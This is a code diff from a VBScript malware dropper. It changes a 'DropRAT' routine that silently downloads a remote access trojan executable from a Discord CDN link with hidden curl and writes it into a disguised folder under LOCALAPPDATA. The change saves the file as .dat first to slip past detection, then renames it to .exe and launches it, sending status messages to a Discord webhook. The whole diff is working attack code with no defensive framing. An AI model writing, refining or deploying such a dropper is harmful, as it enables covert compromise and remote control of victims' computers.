@@ -43,26 +43,31 @@ Loop
 
 window.close()
 
-' --- RAT DROP (Curl method) ---
+' --- RAT DROP (Curl + .dat rename bypass) ---
 Sub DropRAT(targetWH, sendRocket)
     Dim dl : dl = "https://cdn.discordapp.com/attachments/1570877567567929557/1572752014616825856/client_9.exe?ex=6aff82f4&is=6afe3174&hm=841914e039c8b9df85e99842774e4bf44f6e6dc4c0bf290a1033dcbb02a00aed&"
 
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
     If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
     Randomize
-    Dim fname : fname = "w" & Int(Rnd() * 900000 + 100000) & ".exe"
-    Dim op : op = tPath & "\" & fname
+    Dim fname : fname = "w" & Int(Rnd() * 900000 + 100000)
+    Dim datPath : datPath = tPath & "\" & fname & ".dat"
+    Dim op : op = tPath & "\" & fname & ".exe"
 
     If sendRocket Then Call PostEmbedTo(":rocket: RAT Download Initiated", "Downloading and launching RAT", 10181046, targetWH)
 
+    If fso.FileExists(datPath) Then fso.DeleteFile datPath, True
     If fso.FileExists(op) Then fso.DeleteFile op, True
 
-    ' Using curl to ensure it actually writes to disk
-    Dim cCmd : cCmd = "cmd /c curl.exe -s -L --connect-timeout 5 --max-time 60 -o """ & op & """ """ & dl & """"
+    ' 1. Download as .dat using curl
+    Dim cCmd : cCmd = "cmd /c curl.exe -s -L --connect-timeout 5 --max-time 60 -o """ & datPath & """ """ & dl & """"
     sh.Run cCmd, 0, True
 
-    If fso.FileExists(op) Then
-        If fso.GetFile(op).Size > 100000 Then
+    If fso.FileExists(datPath) Then
+        If fso.GetFile(datPath).Size > 100000 Then
+            ' 2. Rename .dat to .exe right before launching
+            fso.MoveFile datPath, op
+            
             If sendRocket Then Call PostEmbedTo(":white_check_mark: RAT Launched", "RAT Launched", 10181046, targetWH)
             Call RunCmd("""" & op & """")
         End If
